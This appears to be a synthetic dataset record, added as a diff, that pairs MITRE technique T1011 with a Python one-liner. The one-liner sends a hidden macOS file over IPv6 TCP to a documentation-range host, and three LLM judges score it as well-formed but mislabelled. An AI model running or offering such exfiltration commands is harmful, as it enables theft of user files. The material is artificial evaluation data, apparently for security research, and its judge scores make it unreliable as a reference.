@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Python",
+  "command": "python3 -c 'import socket; s=socket.socket(socket.AF_INET6, socket.SOCK_STREAM); s.connect((\"2001:db8:ac:2::9\", 55999, 0, 0)); s.sendall(open(\"/Users/Shared/._q\",\"rb\").read()); s.close()'",
+  "explanation": "Sends data over IPv6 TCP on a non-standard port, leveraging IPv6 as an alternative medium relative to common IPv4/TCP C2 paths, matching T1011.",
+  "rationale_steps": [
+    "Create an IPv6 TCP socket.",
+    "Connect to a documentation IPv6 address on an uncommon port (55999).",
+    "Transmit the file as a single stream over IPv6 (alternate network medium).",
+    "No obfuscation; standard user permissions."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-e8d4b4c2-afb87854",
+  "source_prompt_hash": "e8d4b4c2",
+  "timestamp_utc": "2025-09-30T08:45:56.629990Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python one-liner is perfectly well-formed with balanced quotes, parentheses, and proper syntax for socket operations in Python.",
+        "semantic_score": 1,
+        "semantic_justification": "The command establishes an IPv6 connection to exfiltrate local data, but this represents data exfiltration (T1048) rather than searching closed sources (T1011) as claimed.",
+        "combined_score": 3.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T11:42:30.430260Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed Python code, with balanced quotes, parentheses, and valid syntax for creating a socket, connecting, reading a file, and sending data.",
+        "semantic_score": 1,
+        "semantic_justification": "The command sends local data to a remote host, which is an exfiltration or C2 action, and does not align with the T1011 technique of acquiring or querying information from closed sources.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T11:42:39.449494Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python one-liner has balanced quotes/parentheses, valid IPv6 connect tuple, proper statement separators, and is parseable as-is.",
+        "semantic_score": 1,
+        "semantic_justification": "The command exfiltrates file data over IPv6 TCP but does not perform any closed-source searching, so it does not align with the provided technique description.",
+        "combined_score": 3.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T11:43:06.520848Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.0,
+    "llm_average_score": 3.0,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
